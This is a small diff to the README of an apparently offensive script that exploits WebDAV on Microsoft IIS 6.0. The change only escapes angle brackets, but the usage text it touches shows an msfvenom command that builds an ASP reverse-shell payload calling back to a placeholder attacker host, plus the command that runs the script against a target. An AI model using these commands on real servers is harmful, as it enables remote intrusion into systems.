@@ -4,6 +4,6 @@ Simple Script to exploit Webdav running on Microsoft IIS 6.0 incorrectly executi
 
 **TO USE:**
 
-Generate msfvenom payload: e.g. msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > <filename>
+Generate msfvenom payload: e.g. msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > \<filename\>
   
-Then run: ./script <host> <filename>
+Then run: ./script \<host\> \<filename\>
